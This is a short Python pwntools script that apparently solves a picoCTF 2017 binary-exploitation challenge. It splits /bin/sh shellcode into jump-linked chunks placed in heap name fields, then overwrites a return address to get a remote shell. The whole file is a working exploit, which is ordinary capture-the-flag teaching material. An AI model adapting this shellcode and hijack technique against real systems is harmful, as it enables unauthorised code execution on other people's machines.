# By Harrison Green <hgarrereyn>

from pwn import *

# Found on shell-storm.org:
# http://shell-storm.org/shellcode/files/shellcode-811.php

# Shellcode (/bin/sh on 32 bit)
# 08048060 <_start>:
 # 8048060: 31 c0                 xor    %eax,%eax
 # 8048062: 50                    push   %eax
 # 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 # 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 # 804806d: 89 e3                 mov    %esp,%ebx
 # 804806f: 89 c1                 mov    %eax,%ecx
 # 8048071: 89 c2                 mov    %eax,%edx
 # 8048073: b0 0b                 mov    $0xb,%al
 # 8048075: cd 80                 int    $0x80
 # 8048077: 31 c0                 xor    %eax,%eax
 # 8048079: 40                    inc    %eax
 # 804807a: cd 80                 int    $0x80

# Relative jump:
#  EB CB - where CB is a signed integer to be added to eip


# Modified leapfrog shellocode with added short jumps:

### Name 1
# 31 c0
# 50
# 68 2f 2f 73 68
name1 = '\x31\xc0\x50\x68\x2f\x2f\x73\x68' + '\xeb\x0e'

### Name 2
# 68 2f 62 69 6e
# 89 e3
# 89 c1
name2 = '\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1' + '\xeb\x0d'

### Name 3
# 89 c2
# b0 0b
# cd 80
# 31 c0
name3 = '\x89\xc2\xb0\x0b\xcd\x80\x31\xc0' + '\xeb\x0e'

### Name 4
# 40
# cd 80
name4 = '\x40\xcd\x80'


# Heap layout:
# <name 1 : 12 bytes>
# <junk : 12 bytes>
# <name 2 : 12 bytes> ...


sock = remote('shell2017.picoctf.com', 47601)

# Select 11 unicorns
sock.send(('u\n' * 11))

# Add shellcode
sock.send(name1 + '\n')
sock.send(name2 + '\n')
sock.send(name3 + '\n')
sock.send(name4 + '\n')

# Fill the rest of the names
for i in range(6):
	sock.send('name\n')

# jump to shellcode by overwriting the return address with 0xffffdb9a
sock.send('aa' + '\x9a\xdb\xff\xff' + '\n')

# flee unicorns
sock.send(('f\n' * 11))

# flee dragon
sock.send(('f\n' * 6))

# Game exits but actually jumps to shellcode

# We've got shell
sock.interactive()
